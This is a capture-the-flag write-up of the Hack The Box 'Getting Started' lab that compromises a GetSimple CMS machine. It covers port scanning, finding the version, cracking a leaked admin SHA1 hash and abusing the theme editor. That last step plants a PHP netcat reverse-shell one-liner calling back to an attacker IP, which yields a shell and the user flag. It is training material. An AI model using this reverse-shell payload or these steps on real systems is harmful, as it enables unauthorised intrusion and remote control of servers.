---


---

<h1 id="knowledge-check-walktrough">Knowledge Check Walktrough</h1>
<p>Write up of the Getting Started HTB modules</p>
<h2 id="scanning-the-target">Scanning the target</h2>
<p>Enumeration/Scanning with <code>Nmap</code> - perform a quick scan for open ports followed by a full port scan:</p>
<pre><code>nmap -sV -sC -p- 10.129.176.153

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/admin/
|_http-title: Welcome to GetSimple! - gettingstarted
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>Analysing the web server:</p>
<pre><code>whatweb 10.129.176.153
http://10.129.176.153 [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.176.153], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]
</code></pre>
<p>Directory fuzzing:</p>
<pre><code>ffuf -w directory-list-2.3-small.txt:FUZZ -u http://10.129.176.153:80/FUZZ
</code></pre>
<p><a href="http://10.129.176.153/data/">http://10.129.176.153/data/</a><br>
<a href="http://10.129.176.153/backups/">http://10.129.176.153/backups/</a><br>
<a href="http://10.129.176.153/theme/">http://10.129.176.153/theme/</a><br>
<a href="http://10.129.176.153/plugins/">http://10.129.176.153/plugins/</a><br>
<a href="http://10.129.176.153/admin/">http://10.129.176.153/admin/</a></p>
<p>so this web site is working with a cms called “get simple”<br>
lest try to investigate the version of this cms because there is a lot of exploit but we need to find the version</p>
<pre><code>http://10.129.26.161/data/cache/2a4c6447379fba09620ba05582eb61af.txt
{"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}
</code></pre>
<p>we found the version here.<br>
lest find exploit related:</p>
<pre><code> searchsploit getsimple CMS 3.3.15
</code></pre>
<p>No result<br>
but for the latest version there is an exploit :</p>
<pre><code>GetSimple CMS v3.3.16 - Remote Code Execution (RCE)                                   | php/webapps/51475.py
</code></pre>
<p>when we analyse the python code of the exploit, we see this exploit is working for the 3.3.15 versions</p>
<pre><code>if version &lt;= "3.3.16":
	print( red + f"[+] the version {version} is vulnrable to CVE-2022-41544")
</code></pre>
<p>in data/users/admin.xml there is:</p>
<pre><code>&lt;item&gt;&lt;USR&gt;admin&lt;/USR&gt;&lt;NAME/&gt;&lt;PWD&gt;d033e22ae348aeb5660fc2140aec35850c4da997&lt;/PWD&gt;&lt;EMAIL&gt;admin@gettingstarted.com&lt;/EMAIL&gt;&lt;HTMLEDITOR&gt;1&lt;/HTMLEDITOR&gt;&lt;TIMEZONE/&gt;&lt;LANG&gt;en_US&lt;/LANG&gt;
</code></pre>
<p>username = admin<br>
the password seems encrypted in sha1<br>
d033e22ae348aeb5660fc2140aec35850c4da997<br>
decrypted = admin</p>
<p>we try to connect and we got access to the admin pannel.</p>
<p>there is an api key here:</p>
<p><a href="http://10.129.26.161/data/other/authorization.xml">http://10.129.26.161/data/other/authorization.xml</a></p>
<pre><code>&lt;item&gt;&lt;apikey&gt;&lt;![CDATA[4f399dc72ff8e619e327800f851e9986]]&gt;&lt;/apikey&gt;&lt;/item&gt;
</code></pre>
<p>usefull if we use the exploit or we cant decrypt the password but for the moment we continue manualy</p>
<p>in the theme editor menue we can edit php theme files<br>
<a href="http://10.129.26.161/admin/theme-edit.php">http://10.129.26.161/admin/theme-edit.php</a><br>
so we can inject a reverse shell php code like this:</p>
<pre><code>&lt;?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.176 9443 &gt;/tmp/f"); ?&gt;
</code></pre>
<p>and click on save</p>
<p>start an netcat listener on port 9443</p>
<pre><code>nc -lvnp 9443
listening on [any] 9443 ...
</code></pre>
<p>activate the reverse shell code</p>
<pre><code> curl http://10.129.26.161:80/theme/Innovation/template.php
</code></pre>
<p>connected:</p>
<pre><code>connect to [10.10.14.176] from (UNKNOWN) [10.129.26.161] 42302
/bin/sh: 0: can't access tty; job control turned off
$
$ cd home
$ ls
mrb3n
$ cd mrb3n
$ ls
user.txt
$ cat user.txt
7002d65b149b0a4d19132a66feed21d8
</code></pre>

